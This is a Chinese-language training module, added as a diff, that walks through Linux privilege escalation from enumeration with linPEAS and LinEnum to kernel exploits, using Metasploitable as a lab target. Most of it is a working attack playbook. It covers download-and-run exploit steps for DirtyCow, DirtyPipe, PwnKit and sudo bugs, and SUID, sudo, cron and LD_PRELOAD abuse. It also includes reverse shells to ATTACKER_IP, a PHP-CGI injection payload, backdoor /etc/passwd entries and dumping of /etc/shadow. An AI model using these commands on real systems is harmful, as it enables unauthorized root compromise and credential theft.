@@ -1,0 +1,708 @@
+================================================================================
+模块: Linux权限提升完整指南
+学习目标: 掌握Linux提权全流程，从信息收集到内核漏洞利用，覆盖所有主流提权向量
+目标工具: LinEnum, linPEAS, linux-exploit-suggester, linuxprivchecker, pspy, unix-privesc-check
+所需环境: ArchStrike (攻击机), Linux靶机 (如Metasploitable2/3)
+================================================================================
+
+一、提权前的准备工作
+--------------------------------------------------------------------------------
+
+权限提升（Privilege Escalation）是红队行动中继初始访问后的关键步骤。
+成功获取一个低权限shell后，下一步必然是提权至root。
+
+提权的核心逻辑:
+  1. 系统配置错误 → 可利用的权限配置
+  2. 软件漏洞 → 可利用的版本缺陷
+  3. 用户行为疏忽 → 可滥用的信任关系
+
+在开始之前，你首先需要一个低权限shell。常见的低权限入口包括:
+  - Web应用漏洞（文件上传、命令注入）获得的www-data用户
+  - 钓鱼/社工获得的普通用户
+  - 默认/弱密码登录的服务账户
+  - 通过SSH key获取的非特权账户
+
+获得初始shell后，第一个命令:
+  id
+  whoami
+
+二、第一阶段: 信息收集工具
+--------------------------------------------------------------------------------
+
+2.1 LinEnum - 全面系统信息收集
+
+LinEnum是一个经典的Linux信息收集脚本，可以自动化地收集大量系统信息。
+
+下载LinEnum:
+
+  wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+  chmod +x LinEnum.sh
+
+上传到目标:
+
+  # 在攻击机上启动HTTP服务
+  python3 -m http.server 8080
+  
+  # 在目标机上执行
+  wget http://ATTACKER_IP:8080/LinEnum.sh -O /tmp/le.sh
+  chmod +x /tmp/le.sh
+  /tmp/le.sh | tee /tmp/linenum_output.txt
+
+LinEnum收集的信息包括:
+  - 内核版本（用于查找内核漏洞）
+  - 系统信息（发行版、CPU、架构）
+  - 用户信息（当前用户、所有用户、/etc/passwd内容）
+  - 网络信息（IP、路由、监听端口）
+  - SUID/SGID文件
+  - 可写的配置文件和目录
+  - Cron任务
+  - 敏感文件（包含password、secret的文件）
+
+LinEnum输出解读 - 重点关注:
+  [-] Kernel information    → 内核版本（匹配CVE）
+  [-] SUID files           → 高亮显示，重点分析
+  [-] SGID files           → 可能可写的SGID文件
+  [-] Writable files       → /etc/passwd, /etc/shadow等
+  [-] Cron jobs            → 定时任务脚本
+  [-] Sudo version         → 是否有sudo提权漏洞
+  [-] Processes             → 以root运行的进程
+
+2.2 linPEAS - 自动化权限分析（最推荐）
+
+linPEAS是目前最流行的Linux权限提升枚举脚本，来自PEAS系列。
+
+下载linPEAS:
+
+  # 下载最新版本
+  wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+  chmod +x linpeas.sh
+
+上传到目标并运行:
+
+  Step 1: 在攻击机上:
+    python3 -m http.server 8088
+
+  Step 2: 在目标机上:
+    wget http://ATTACKER_IP:8088/linpeas.sh -O /tmp/lp.sh
+    chmod +x /tmp/lp.sh
+    /tmp/lp.sh | tee /tmp/peas_output.txt
+
+  Step 3: 分析PEAS输出
+    重点查看输出中的:
+    
+    ╔══════════╗
+    ║  Red/Yellow markings  ║  ← 红色/黄色标注 = 高概率提权向量
+    ╚══════════╝
+    
+    - 🔴 RED (红色): 几乎100%可提权的配置
+      例如: 可写的/etc/passwd, 可写root用户的cron任务
+    
+    - 🟡 YELLOW (黄色): 可能导致提权的配置
+      例如: SUDO权限配置特殊二进制, SUID二进制, Docker组成员
+    
+    - 🔵 CYAN (蓝色): 信息（需要进一步分析）
+
+PEAS输出重点关注部分:
+  ┌─────────────────────────────────────────────┐
+  │ 1. System Information     系统基本信息      │
+  │ 2. Container Detection    容器/虚拟机检测   │
+  │ 3. Sudo tokens            Sudo令牌          │
+  │ 4. SUID/SGID/Capabilities 特殊权限文件      │
+  │ 5. Writable files/folders 可写文件/目录     │
+  │ 6. Cron/Systemd timers    定时任务          │
+  │ 7. Network                 网络信息          │
+  │ 8. Processes               运行进程          │
+  │ 9. Cloud credentials      云凭证            │
+  │ 10.Interesting files      敏感文件          │
+  └─────────────────────────────────────────────┘
+
+2.3 linux-exploit-suggester - 内核漏洞匹配
+
+这个工具会检测目标系统的内核版本和补丁级别，然后根据已知CVE
+推荐可用的漏洞利用。
+
+安装与使用:
+
+  wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
+  chmod +x linux-exploit-suggester.sh
+
+上传到目标:
+
+  Step 1: 攻击机:
+    python3 -m http.server 8088
+
+  Step 2: 目标机:
+    wget http://ATTACKER_IP:8088/linux-exploit-suggester.sh -O /tmp/les.sh
+    chmod +x /tmp/les.sh
+    /tmp/les.sh | tee /tmp/les_output.txt
+
+输出解读:
+  
+  [CVE-2016-5195] dirtycow
+  [CVE-2017-1000367] Sudo <= 1.8.21
+  [CVE-2021-3156] sudoedit (Baron Samedit)
+  [CVE-2021-4034] PwnKit (pkexec)
+  [CVE-2022-0847] DirtyPipe
+  [CVE-2023-0386] OverlayFS
+
+  优先级排序:
+  ★★★★★ DirtyPipe (内核 5.8 - 5.16.11) - 稳定且影响范围广
+  ★★★★★ PwnKit (pkexec) - 几乎所有Linux都受影响
+  ★★★★☆ DirtyCow (旧内核) - 经典稳定提权
+  ★★★★☆ sudoedit Baron Samedit - sudo版本
+  ★★★☆☆ OverlayFS - 新版本
+
+  如果工具没有推荐，可以加上-k参数进行更深入的检查:
+    /tmp/les.sh -k | tee /tmp/les_full.txt
+
+2.4 linuxprivchecker
+
+linuxprivchecker是一个Python编写的权限审计脚本，提供了另一种视角。
+
+安装:
+
+  wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
+
+上传到目标:
+
+  Step 1: 攻击机:
+    python3 -m http.server 8088
+
+  Step 2: 目标机上（如果有Python）:
+    wget http://ATTACKER_IP:8088/linuxprivchecker.py -O /tmp/lpc.py
+    python /tmp/lpc.py | tee /tmp/lpc_output.txt
+    python3 /tmp/lpc.py | tee /tmp/lpc_output.txt
+
+linuxprivchecker会输出一个结构化的审计报告，重点关注:
+  - [!!] 高严重性发现（红色标记）
+  - [!!] 可写的系统文件
+  - [!!] 异常的系统配置
+
+2.5 unix-privesc-check
+
+unix-privesc-check是另一个通用的Unix/Linux权限审计工具。
+
+安装:
+
+  sudo pacman -S unix-privesc-check
+
+或从源码获取:
+
+  wget https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/upc.sh
+
+上传到目标并运行:
+
+  wget http://ATTACKER_IP:8080/upc.sh -O /tmp/upc.sh
+  chmod +x /tmp/upc.sh
+  /tmp/upc.sh standard > /tmp/upc_standard.txt
+  /tmp/upc.sh thorough > /tmp/upc_thorough.txt   # 更深入的检查
+
+两种模式:
+  - standard: 快速检查（约1-2分钟）
+  - thorough: 全面检查（约5-10分钟，但更可能发现信息）
+
+三、第二阶段: 提权技术路线
+--------------------------------------------------------------------------------
+
+在完成信息收集后，根据PEAS/les的输出选择合适的提权向量。
+
+3.1 SUID二进制文件提权
+
+原理: SUID (Set User ID) 位允许用户以文件所有者的权限执行程序。
+如果root拥有的二进制文件设置了SUID位，任何人执行它都会以root权限运行。
+
+查找SUID文件:
+  find / -perm -4000 -type f 2>/dev/null
+
+常见可利用SUID:
+
+  1) find 命令:
+     find / -name anything -exec /bin/sh -p \;
+     find / -name anything -exec /bin/bash -p \;
+     
+  2) vim/nvim:
+     vim -c ':python3 import os; os.setuid(0); os.system("/bin/bash")'
+     # 或通过vim打开后 :!bash 或 :shell
+     
+  3) bash:
+     如果bash有SUID (罕见):
+       /bin/bash -p   # -p保持euid
+
+  4) cp/mv:
+     可以覆盖/etc/passwd或/etc/shadow:
+       # 先创建自定义的passwd条目
+       echo "root2:$(openssl passwd -1 password):0:0:root:/root:/bin/bash" >> /etc/passwd
+       su root2
+
+  5) nmap (旧版本有--script功能):
+     nmap --interactive
+     !/bin/bash
+
+  6) python/perl:
+     python -c 'import os; os.setuid(0); os.system("/bin/bash")'
+     perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
+
+  7) systemctl/sudo (特殊配置):
+     如果SUID的systemctl允许运行任意service
+
+GTFO Bins (Get The F*ck Out Binaries):
+  GTFO Bins是一个在线资源，列出了所有可以被滥用的Unix二进制文件。
+  在线查看: https://gtfobins.github.io
+
+  在Firefox中打开:
+    Step 1: 打开Firefox
+    Step 2: 访问 https://gtfobins.github.io
+    Step 3: 搜索你发现的SUID二进制文件（如"find", "vim", "less"）
+    Step 4: 按照网站提供的sudo和suid分组查看提权命令
+
+3.2 Sudo配置错误
+
+列出当前用户的sudo权限:
+  sudo -l
+
+可能出现在sudo -l中的危险条目:
+
+  1) (ALL) NOPASSWD: ALL
+     → 直接 sudo su 获得root
+
+  2) (root) NOPASSWD: /usr/bin/vim
+     → sudo vim -c ':!/bin/bash'
+
+  3) (root) NOPASSWD: /usr/bin/less
+     → sudo less /var/log/syslog
+     → 在less中按 !/bin/bash
+
+  4) (root) NOPASSWD: /usr/bin/man
+     → sudo man man
+     → 在man中按 !/bin/bash
+
+  5) (root) NOPASSWD: /usr/bin/find
+     → sudo find . -exec /bin/bash \;
+
+  6) (root) NOPASSWD: /usr/bin/python
+     → sudo python -c 'import os; os.system("/bin/bash")'
+
+  7) env_keep+=LD_PRELOAD
+     → 编译一个.so库劫持函数，通过sudo加载
+     → 在GTFOBins查看完整利用方式
+
+Sudo漏洞提权 (无需特权sudo条目):
+
+  CVE-2021-3156 (Baron Samedit / sudoedit堆溢出):
+    影响: sudo 1.8.2 - 1.8.31p2 和 1.9.0 - 1.9.5p1
+    利用: 
+      下载 exp: https://github.com/blasty/CVE-2021-3156
+      gcc exploit.c -o exploit
+      ./exploit
+      whoami  # 应该是root
+
+  CVE-2019-14287 (sudo绕过):
+    影响: sudo < 1.8.28
+    利用条件: sudo -l显示 (ALL, !root) /bin/bash
+    提权命令:
+      sudo -u#-1 /bin/bash
+      whoami  # root
+
+3.3 Cron任务劫持
+
+查看系统cron任务:
+
+  cat /etc/crontab
+  ls -la /etc/cron.d/
+  ls -la /etc/cron.daily/
+  ls -la /etc/cron.hourly/
+  ls -la /etc/cron.weekly/
+  ls -la /etc/cron.monthly/
+
+查看用户cron任务:
+
+  crontab -l
+  ls -la /var/spool/cron/crontabs/
+  ls -la /var/spool/cron/
+
+Cron提权的三种情况:
+
+  情况A: 可写的cron脚本
+    如果cron以root权限运行某个脚本，且该脚本对你可写:
+      echo '#!/bin/bash' > /etc/cron.daily/backup.sh
+      echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /etc/cron.daily/backup.sh
+      等待cron执行后: /tmp/rootbash -p
+
+  情况B: 通配符注入 (Wildcard Injection)
+    cron脚本中使用tar时:
+      脚本内容: cd /var/backup && tar czf /tmp/backup.tar.gz *
+      如果/var/backup对你可写，创建文件:
+        echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" > /var/backup/runme.sh
+        touch "/var/backup/--checkpoint=1"
+        touch "/var/backup/--checkpoint-action=exec=sh runme.sh"
+      等待tar命令以root执行时触发
+
+  情况C: PATH劫持
+    如果cron脚本中使用相对路径调用命令（如backup而非/usr/bin/backup）:
+      检查cron的PATH变量
+      向PATH中的某个可写目录写入伪造的backup可执行文件
+
+3.4 可写服务文件 (Systemd)
+
+检查可写的服务文件:
+  find /etc/systemd/system /usr/lib/systemd/system -writable -type f 2>/dev/null
+  find /etc/systemd/system /usr/lib/systemd/system -type f -name "*.service" 2>/dev/null | while read f; do
+    [ -w "$f" ] && echo "[!] 可写: $f"
+  done
+
+如果发现可写.service文件:
+  编辑该文件，修改ExecStart为反弹shell:
+    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
+  重启服务:
+    systemctl daemon-reload
+    systemctl restart vulnerable-service
+
+3.5 Docker组提权
+
+检查当前用户是否在docker组:
+  groups
+  id | grep docker
+
+如果用户在docker组中:
+  docker run -v /:/mnt -it alpine chroot /mnt
+  whoami  # root (在chroot环境中)
+  cat /mnt/etc/shadow  # 读取目标系统的shadow文件
+
+更简单的Docker提权:
+  docker run -v /:/mnt -it alpine /bin/sh
+  # 在容器中:
+  chroot /mnt
+  # 或
+  cp /bin/bash /mnt/tmp/rbash
+  chmod +s /mnt/tmp/rbash
+
+3.6 能力(Capabilities)提权
+
+查看文件和进程的能力:
+  getcap -r / 2>/dev/null
+
+重点关注能力:
+  cap_setuid+ep           → 可以执行setuid(0)
+  cap_dac_override+ep     → 可以绕过文件权限检查
+  cap_sys_admin+ep        → 几乎等同于root
+  cap_sys_ptrace+ep       → 可以调试任意进程（包括root进程）
+  cap_sys_module+ep       → 可以加载内核模块
+  cap_net_admin+ep        → 可以修改网络配置
+  cap_sys_rawio+ep        → 可执行原始I/O操作
+
+Python与cap_setuid提权:
+  python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+Perl:
+  perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
+
+3.7 NFS no_root_squash
+
+检查NFS导出配置:
+  cat /etc/exports
+
+如果看到:
+  /home *(rw,sync,no_root_squash)
+  /data *(rw,no_root_squash)
+
+利用方法:
+  # 在攻击机上:
+  showmount -e TARGET_IP
+  mkdir /tmp/nfs_mount
+  mount -t nfs TARGET_IP:/home /tmp/nfs_mount
+  
+  # 编译一个SUID bash:
+  cat <<EOF > /tmp/nfs_mount/rootshell.c
+  int main() { setuid(0); setgid(0); system("/bin/bash"); return 0; }
+  EOF
+  
+  gcc /tmp/nfs_mount/rootshell.c -o /tmp/nfs_mount/rootshell
+  chmod +s /tmp/nfs_mount/rootshell
+  
+  # 在目标机上执行:
+  /home/rootshell  # 由于no_root_squash，文件所有者为root+SUID
+
+3.8 可写的/etc/passwd提权
+
+检查:
+  ls -la /etc/passwd
+  ls -la /etc/shadow
+
+如果/etc/passwd可写:
+  openssl passwd -1 password123
+  echo "newroot:\$1\$output_from_above:0:0:root:/root:/bin/bash" >> /etc/passwd
+  su newroot
+  输入密码: password123
+
+如果/etc/shadow可写:
+  openssl passwd -1 password123
+  # 替换root的密码hash为上述命令的输出
+  su root
+  输入密码: password123
+
+3.9 LD_PRELOAD / LD_LIBRARY_PATH提权
+
+检查sudo配置:
+  sudo -l
+
+如果看到:
+  env_keep+=LD_PRELOAD
+
+利用:
+  # 创建共享库
+  cat <<EOF > shell.c
+  #include <stdio.h>
+  #include <sys/types.h>
+  #include <stdlib.h>
+  void _init() {
+    unsetenv("LD_PRELOAD");
+    setuid(0);
+    setgid(0);
+    system("/bin/bash");
+  }
+  EOF
+  
+  gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+  sudo LD_PRELOAD=/tmp/shell.so some_allowed_command
+
+LD_LIBRARY_PATH:
+  # 如果sudo保留了LD_LIBRARY_PATH
+  ldd /usr/bin/some_allowed_command
+  # 劫持其中一个库:
+  gcc -shared -fPIC -o /tmp/libname.so exploit.c
+  sudo LD_LIBRARY_PATH=/tmp some_allowed_command
+
+3.10 PATH变量劫持
+
+如果root定期运行的一个脚本使用相对路径:
+  检查常见的PATH可写目录:
+    echo $PATH
+    find / -writable -type d 2>/dev/null | grep -v /proc | grep -v /sys
+
+  在可写PATH目录创建伪造的命令:
+    # 假设root定期运行ls（无完整路径）的脚本
+    echo '/bin/bash' > /tmp/ls    # 如果/tmp在PATH中
+    chmod +x /tmp/ls
+    export PATH=/tmp:$PATH
+
+四、第三阶段: 内核漏洞提权
+--------------------------------------------------------------------------------
+
+当配置类提权向量都不可行时，内核漏洞是最后的底牌。
+
+4.1 DirtyCow (CVE-2016-5195)
+
+影响: Linux内核 2.x 到 4.8.3 (2016之前的大部分系统)
+特点: 非常稳定，影响范围广
+
+利用步骤:
+  Step 1: 上传dirtycow exploit到目标
+    wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
+    编译: gcc -pthread dirty.c -o dirty -lcrypt
+    （或下载预编译版本）
+  
+  Step 2: 在目标机上执行
+    ./dirty password123
+  
+  Step 3: 验证
+    su firefart
+    whoami  # root
+
+4.2 DirtyPipe (CVE-2022-0847)
+
+影响: Linux内核 5.8 到 5.16.11
+特点: 非常可靠，影响几乎所有新版本Linux
+
+利用步骤:
+  Step 1: 下载exploit
+    wget https://raw.githubusercontent.com/nicholasaleks/CVE-2022-0847/master/Dirty-Pipe.sh
+    chmod +x Dirty-Pipe.sh
+  
+  Step 2: 执行
+    ./Dirty-Pipe.sh
+    whoami  # root
+
+  或者编译版:
+    wget https://haxx.in/files/dirtypipez.c
+    gcc dirtypipez.c -o dirtypipez
+    ./dirtypipez /usr/bin/su   # 覆盖su二进制
+    su  # 直接获取root shell
+
+4.3 PwnKit (CVE-2021-4034)
+
+影响: Polkit's pkexec (几乎所有Linux发行版)
+特点: 影响极广，2021年底才被修补
+
+利用步骤:
+  Step 1: 下载exploit
+    wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.c
+    gcc PwnKit.c -o PwnKit
+  
+  Step 2: 执行
+    ./PwnKit
+    whoami  # root
+
+  或使用Python版本:
+    wget https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve2021-4034.py
+    python3 cve2021-4034.py
+    whoami  # root
+
+4.4 OverlayFS (CVE-2021-3493 / CVE-2023-0386)
+
+CVE-2023-0386 (较新):
+  影响: Linux内核 5.11到6.2
+
+  利用:
+    wget https://raw.githubusercontent.com/sxlmnwb/CVE-2023-0386/main/exploit.c
+    gcc -o exploit exploit.c
+    ./exploit
+
+CVE-2021-3493 (稍旧):
+  影响: Ubuntu 20.10, 20.04 LTS等
+
+  利用:
+    wget https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c
+    gcc exploit.c -o exploit
+    ./exploit
+    whoami  # root
+
+4.5 使用linux-exploit-suggester自动化匹配
+
+完整流程示例:
+
+  Step 1: 上传并运行linux-exploit-suggester
+    wget http://ATTACKER_IP:8088/linux-exploit-suggester.sh -O /tmp/les.sh
+    bash /tmp/les.sh | tee /tmp/les_output.txt
+  
+  Step 2: 查看输出
+    cat /tmp/les_output.txt
+    找到匹配的CVE
+  
+  Step 3: 根据CVE在攻击机上下载对应exploit
+    # 在攻击机上
+    searchsploit linux kernel LOCAL | grep "Privilege Escalation"
+    searchsploit -m 45010   # 下载 exploit-db 中的exploit
+  
+  Step 4: 编译并上传
+    # 如果需要编译（目标机可能没有gcc）
+    gcc -static exploit.c -o exploit  # 静态编译避免依赖问题
+  
+  Step 5: 将编译好的exploit传到目标
+    wget http://ATTACKER_IP:8088/exploit -O /tmp/exploit
+    chmod +x /tmp/exploit
+    /tmp/exploit
+  
+  Step 6: 验证
+    whoami
+    id
+
+4.6 内核漏洞提权注意事项
+
+  1. 编译问题: 目标机可能没有gcc
+     → 在攻击机上用相同架构的静态编译(gcc -static)
+     → 或使用musl-gcc进行静态编译
+
+  2. 架构不匹配: 32位 vs 64位
+     → 用uname -m检查: x86_64表示64位, i686/i386表示32位
+     → 确保exploit编译的目标架构正确
+
+  3. 内核版本精确匹配
+     → uname -r 获取精确版本号
+     → cat /etc/os-release 获取发行版信息
+  
+  4. 不稳定因素
+     → 内核exploit可能造成系统崩溃(内核panic)
+     → 在有授权的测试环境中运行
+     → 备份重要数据
+
+五、完整实践: Metasploitable2手动提权
+--------------------------------------------------------------------------------
+
+以下是在Metasploitable2靶机上从低权限到root的完整实践。
+
+环境: 攻击机(ArchStrike) + 目标机(Metasploitable2, IP: 192.168.56.102)
+
+Phase 1: 获得初始shell
+
+Step 1: 扫描Metasploitable2的端口和服务
+  nmap -sV -p- 192.168.56.102
+
+Step 2: 利用vsftpd 2.3.4后门获取初始shell
+  # 使用nc连接FTP端口
+  nc 192.168.56.102 21
+  USER backdoor:)
+  PASS anything
+  # 此时vsftpd会在6200端口开启后门shell
+  
+  # 新终端连接:
+  nc 192.168.56.102 6200
+  whoami   # root (恭喜！Metasploitable2的vsftpd直接给root)
+
+  如果换一个更难的切入点（如PHP CGI漏洞）:
+    访问 http://192.168.56.102/cgi-bin/php?-d+allow_url_include%3don+-d+safe_mode%3doff+-d+suhosin%2esimulation%3don+-d+disable_functions%3d%22%22+-d+open_basedir%3dnone+-d+auto_prepend_file%3dphp://input+-n
+    POST数据: <?php system('nc -e /bin/bash ATTACKER_IP 4444'); ?>
+    获得 www-data 用户 (低权限)
+
+Phase 2: 信息收集 (以www-data为例)
+
+Step 1: 确认身份
+  whoami   # www-data
+  id
+  uname -a
+
+Step 2: 上传LinEnum
+  # 攻击机:
+  python3 -m http.server 8080
+  # 目标机:
+  wget http://192.168.56.1:8080/LinEnum.sh -O /tmp/le.sh
+  chmod +x /tmp/le.sh
+  /tmp/le.sh | tee /tmp/le_output.txt
+
+Step 3: 上传linPEAS
+  # 目标机:
+  wget http://192.168.56.1:8080/linpeas.sh -O /tmp/lp.sh
+  chmod +x /tmp/lp.sh
+  /tmp/lp.sh | tee /tmp/lp_output.txt
+
+Phase 3: 分析结果
+
+Step 4: 检查SUID文件
+  find / -perm -4000 -type f 2>/dev/null
+
+Step 5: 检查sudo权限
+  sudo -l    # 如果允许
+
+Step 6: 检查cron任务
+  cat /etc/crontab
+  ls -la /etc/cron.*
+
+Step 7: 检查内核版本
+  uname -a
+  lsb_release -a   # 如果存在
+
+Step 8: 运行linux-exploit-suggester
+  wget http://192.168.56.1:8080/linux-exploit-suggester.sh -O /tmp/les.sh
+  bash /tmp/les.sh
+
+Phase 4: 执行提权
+
+Step 9: 根据发现选择提权方式
+  例如发现unix-udp.c (CVE-2009-2698):
+    wget http://192.168.56.1:8080/exploit.c -O /tmp/exp.c
+    gcc /tmp/exp.c -o /tmp/exp
+    /tmp/exp
+
+Step 10: 验证
+  whoami   # root
+  id       # uid=0(root) gid=0(root)
+
+Step 11: 提取哈希
+  cat /etc/shadow
+  cat /etc/passwd
+
+================================================================================
+总结: Linux提权没有万能解，关键在于系统化的信息收集。PEAS能发现80%的
+配置类提权向量，而linux-exploit-suggester覆盖内核漏洞。组合使用这两个工具，
+结合本文列出的各种SUID/sudo/cron/Docker等技术路线，几乎能在所有Linux
+靶机中找到root之路。记住提权的一般原则: 先研究配置，再考虑内核。
+================================================================================
